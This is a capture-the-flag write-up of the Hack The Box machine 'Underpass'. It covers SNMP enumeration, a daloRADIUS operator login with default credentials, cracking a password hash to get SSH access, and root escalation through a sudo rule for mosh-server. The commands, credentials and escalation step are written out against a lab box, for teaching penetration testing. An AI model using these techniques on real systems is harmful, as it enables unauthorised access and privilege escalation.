---
title: Underpass
layout: post
released: 2024-12-21
creators: dakkmaddy
pwned: true
tags: 
  - os/linux
  - diff/easy
category:
  - HTB
description: Underpass is running a default apache website. If we check udp ports we find that a daloradius is running. Looking through the source of daloradius we find a couple of login pages and default credentials. Using these credentials we login to a dashboard and find credentials for svcMosh. We use his credentials to ssh on the box. svcMosh can run Mosh-server as root which we can use to spawn a root terminal.
image: https://labs.hackthebox.com/storage/avatars/456a4d2e52f182847fb0a2dba0420a44.png
cssclass: custom_htb
---
![Underpass icon](https://labs.hackthebox.com/storage/avatars/456a4d2e52f182847fb0a2dba0420a44.png)

# Information Gathering
As usual let's start off with an `nmap` scan.
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
When we visit the website all we're greeted with is the default `apache` website.
![Default apache website](/assets/img/img_Underpass/Underpass-1746437564868.png)

```
PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info:
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: c7ad5c4856d1cf6600000000
|   snmpEngineBoots: 31
|_  snmpEngineTime: 2d15h28m13s
| snmp-sysdescr: Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
|_  System uptime: 2d15h28m13.71s (22849371 timeticks)
Service Info: Host: UnDerPass.htb is the only daloradius server in the basin!
```

Looking up the term `daloradius` we see that it's a web platform to manage ISP deployments.

If we try to visit: `http://10.10.11.48/daloradius`. We get a forbidden webpage.
![Daloradius Forbidden](/assets/img/img_Underpass/Underpass-1746440428813.png)
Since [daloradius](https://github.com/lirantal/daloradius) is open source, we can look through directories in the source and check if they exist on the box.

Looking through the source we can see a login page: `/app/users/login.php`
![Daloradius Login Path](/assets/img/img_Underpass/Underpass-1746440607075.png)

If we visit http://10.10.11.48/daloradius/app/users/login.php we are greeted by said login page.

![Daloradius User Login Page](/assets/img/img_Underpass/Underpass-1746440648730.png)

# User
Looking through the [wiki](https://github.com/lirantal/daloradius/wiki/Installing-daloRADIUS#testing-the-infrastructure) we find the default credentials: `administrator`:`radius`. However, if we try this we see that we cannot login.

![Cannot Login Daloradius User](/assets/img/img_Underpass/Underpass-1746440793774.png)

If we take a look through the [wiki](https://github.com/lirantal/daloradius/wiki/Installing-daloRADIUS#installing-daloradius) again we find that it is mentioned in the previous sections the different endpoints for `operator` and `user`.

```bash
/etc/apache2/envvars
# daloRADIUS users interface port
export DALORADIUS_USERS_PORT=80

# daloRADIUS operators interface port
export DALORADIUS_OPERATORS_PORT=8000

# daloRADIUS package root directory
export DALORADIUS_ROOT_DIRECTORY=/var/www/daloradius  

# daloRADIUS administrator's email
export DALORADIUS_SERVER_ADMIN=admin@daloradius.local
```

Let's take a look at the source code again and find the directory `/app/operators/login.php`.

![Daloradius Operators Path](/assets/img/img_Underpass/Underpass-1746441057718.png)

If we visit http://10.10.11.48/daloradius/app/operators/login.php we are greeted with the exact same login page.

![Daloradius Operators Login](/assets/img/img_Underpass/Underpass-1746442054856.png)

If we attempt to use the same default credentials: `administrator`:`radius`. We get logged into the dashboard.

![Daloradius Dashboard](/assets/img/img_Underpass/Underpass-1746442166170.png)

Looking around the app if we go to `management` and select `list users`. We can see the user: `svcMosh`.
![Daloradius Users List](/assets/img/img_Underpass/Underpass-1746442236050.png)

We're provided with what looks to be a password hash of `412DD4759978ACFCC81DEAB01B382403`. Let's crack it with [crackstation](https://crackstation.net).

![Crackstation cracking the password](/assets/img/img_Underpass/Underpass-1746442317070.png)

We find we successfully get the credentials: 

`svcMosh`:`underwaterfriends`

Attempting to use these credentials to `ssh` into the machine is successful!

```bash
 ssh svcMosh@10.10.11.48
The authenticity of host '10.10.11.48 (10.10.11.48)' can't be established.
ED25519 key fingerprint is SHA256:zrDqCvZoLSy6MxBOPcuEyN926YtFC94ZCJ5TWRS0VaM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.48' (ED25519) to the list of known hosts.
svcMosh@10.10.11.48's password:
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon May  5 10:51:36 AM UTC 2025

  System load:  0.0               Processes:             226
  Usage of /:   61.3% of 6.56GB   Users logged in:       0
  Memory usage: 11%               IPv4 address for eth0: 10.10.11.48
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon May  5 08:03:59 2025 from 10.10.14.24
svcMosh@underpass:~$
```

Just like that we have `User`!

```bash
svcMosh@underpass:~$ ls -la
total 36
drwxr-x--- 5 svcMosh svcMosh 4096 Jan 11 13:29 .
drwxr-xr-x 3 root    root    4096 Dec 11 16:06 ..
lrwxrwxrwx 1 root    root       9 Sep 22  2024 .bash_history -> /dev/null
-rw-r--r-- 1 svcMosh svcMosh  220 Sep  7  2024 .bash_logout
-rw-r--r-- 1 svcMosh svcMosh 3771 Sep  7  2024 .bashrc
drwx------ 2 svcMosh svcMosh 4096 Dec 11 16:06 .cache
drwxrwxr-x 3 svcMosh svcMosh 4096 Jan 11 13:29 .local
-rw-r--r-- 1 svcMosh svcMosh  807 Sep  7  2024 .profile
drwxr-xr-x 2 svcMosh svcMosh 4096 Dec 11 16:06 .ssh
-rw-r----- 1 root    svcMosh   33 May  2 18:02 user.txt
```

# Root
Checking for our `sudo` permission we notice we are able to run `mosh-server` as `root`.

```bash
svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
```

[mosh](https://mosh.org/) server is part of the `Mobile Shell` suite which is a remote terminal application that runs through `UDP`.

Looking at the [usage](https://mosh.org/#usage) for `mosh` we can see that we can specify the server binary.

![Mosh usage](/assets/img/img_Underpass/Underpass-1746442684093.png)

Let's try to do this to run mosh using the following command.

```bash
mosh --server="sudo /usr/bin/mosh-server" localhost
```

We get the following output.

```bash
mosh --server="sudo /usr/bin/mosh-server" localhost
The authenticity of host 'localhost (<no hostip for proxy command>)' cant be established.
ED25519 key fingerprint is SHA256:zrDqCvZoLSy6MxBOPcuEyN926YtFC94ZCJ5TWRS0VaM.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'localhost' (ED25519) to the list of known hosts.
Warning: SSH_CONNECTION not found; binding to any interface.
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon May  5 10:58:19 AM UTC 2025

  System load:  0.0               Processes:             233
  Usage of /:   61.2% of 6.56GB   Users logged in:       1
  Memory usage: 12%               IPv4 address for eth0: 10.10.11.48
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings



root@underpass:~#
```

Just like that we have root!